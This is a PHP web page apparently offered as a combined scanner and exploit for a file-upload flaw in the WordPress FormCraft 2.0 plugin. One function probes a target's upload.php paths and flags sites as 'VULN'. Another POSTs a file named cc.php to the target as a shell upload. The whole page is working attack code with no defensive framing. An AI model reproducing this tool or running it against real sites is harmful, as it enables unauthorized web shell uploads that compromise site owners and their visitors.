<!DOCTYPE html>
<html>
<head>
	<title>MY SCANNER</title>
</head>
<body>
<center>
	<form method="GET">
		<input type="submit" name="wp" value="wordpress">
		<input type="submit" name="exploit" value="exploit">
	</form>
</center>
</body>
</html>


<?php 
function cek($uri){
	$c="/wp-content/plugins/formcraft/file-upload/server/php/upload.php";
	$cc="/wp-content/plugins/formcraft/file-upload/server/content/upload.php";
	$patern='/{"failed":"No file found 2"}/';

	$ch=curl_init();
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	//curl_setopt ($ch, CURLOPT_POST, 1);
	curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt 	($ch, CURLOPT_URL, $uri.$c);
	if(preg_match($patern, curl_exec($ch)))
	{	
		echo "<center>";
		echo "VULN<br>".$a.$c;
		echo "</center>";
	}
	else 
	{
		curl_setopt ($ch, CURLOPT_URL, $uri.$cc);
		if(preg_match($patern, curl_exec($ch)))
			{
				echo "<center>";
				echo "VULN<br>".$uri.$cc;
				echo "</center>";
			}
	}

	curl_close($ch);
}
function ex($uri){
	$uploadfile="cc.php"; 
$ch = curl_init("$uri");
curl_setopt($ch, CURLOPT_POST, true);   
curl_setopt($ch, CURLOPT_POSTFIELDS,
        array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";
}
//=================================== end function ===============
if(isset($_GET['wp']))
{
	?>
	<hr>
	<center>
		<h1>WordPress FormCraft 2.0 CSRF / Shell Upload scaner</h1>
	<form method="POST">
		<input type="text" name="uri">
		<input type="submit" name="scan">
	</form>
	</center>
	<?php
	if(isset($_POST['scan']))
	{
		cek($_POST['uri']);
	}
}

if(isset($_GET['exploit']))
{
	?>
	<center>
		<hr>
		<h1>WordPress FormCraft 2.0 CSRF / Shell Upload exploit</h1>
	<form method="POST">
		<input type="text" name="uri">
		<input type="submit" name="go">
	</form>
	</center>
	<?php
	if(isset($_POST['go']))
	{
		ex($_POST['uri']);
	}
}
 ?>
